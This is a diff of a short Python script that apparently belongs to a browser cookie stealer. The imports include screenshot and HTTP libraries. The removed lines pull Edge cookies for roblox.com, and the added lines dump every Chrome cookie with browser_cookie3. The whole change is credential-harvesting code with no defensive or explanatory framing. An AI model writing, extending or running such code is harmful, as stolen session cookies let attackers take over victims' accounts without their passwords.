@@ -1,35 +1,19 @@
 import socket
+from typing import Optional
+
 import requests
 from requests import get
 from PIL import ImageGrab
 import os
 import random
 import browser_cookie3
-
-def getCookiesFromDomain(domain,cookieName=''):
-
-    Cookies={}
-    chromeCookies = list(browser_cookie3.edge())
-
-    for cookie in chromeCookies:
-
-        if (domain in cookie.domain):
-            Cookies[cookie.name]=cookie.value
-
-    if(cookieName!=''):
-        try:
-            return Cookies[cookieName]
-        except:
-            return {}
-    else:
-        return Cookies
-
-print(getCookiesFromDomain("roblox.com", ""))
+import re
 
 
+cookies = list(browser_cookie3.chrome())
 
-
-
+for i in cookies:
+    print (i)
 
 
 
